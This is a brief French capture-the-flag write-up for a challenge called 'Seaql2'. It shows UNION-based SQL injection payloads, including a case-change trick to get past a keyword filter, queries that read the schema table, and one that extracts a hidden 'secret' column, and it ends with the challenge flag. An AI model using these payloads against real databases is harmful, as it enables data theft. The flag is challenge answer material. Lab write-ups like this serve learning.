# Seaql2

## Write-up

On essaye de trouver le flag dans la base de donnée.

On se rend compte que le template montre 3 colonnes avec :
`' union select 1, 'dummy title', 'random description'`

Ensuite, on voit qu'il y a un filtre, mais SQL n'est pas sensible à la case, donc on peut bypass le filtre en mettant `' union select 1, Sql, 'dummy description' from sql_Schema`

On voit qu'il y a une table nommée `hidden_secrets` avec une colonne `secret`, on peut donc faire:

`' union select 1, secret, 'bob' from Hidden_secrets -- `

## Flag

`flag-P1r4t3s_Ar3nt_Th3_0nly_0n3s_Wh0_L0v3_G0ld!`
